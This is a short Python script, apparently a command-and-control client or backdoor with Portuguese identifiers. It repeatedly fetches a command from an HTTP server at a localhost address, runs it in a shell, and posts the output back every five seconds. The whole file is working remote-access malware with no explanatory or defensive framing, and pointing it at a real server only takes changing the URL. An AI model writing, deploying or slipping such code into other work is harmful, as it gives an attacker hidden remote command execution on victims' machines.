import requests, json, subprocess, time

url = "http://127.0.0.1:9910/"
ultimo_comando = ""

def get():
    while True:
        payload = ""
        header = {}

        request_get = requests.get(url, headers=header, data=payload)

        response = request_get.json()
        
        ultimo_comando = response[-1]
        
        cmd = ultimo_comando["CMD"]
        
        output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = output.communicate()
        resposta = stdout.decode(encoding="latin-1")
            
        payload_post = json.dumps({
            "comando": resposta
        })

        header_post = {
            "Content-Type":"application/json"
        }

        enviar_post = requests.post(url, headers=header_post, data=payload_post)
        print(f"Saida do comando enviada {enviar_post.text}")
        time.sleep(5)

get()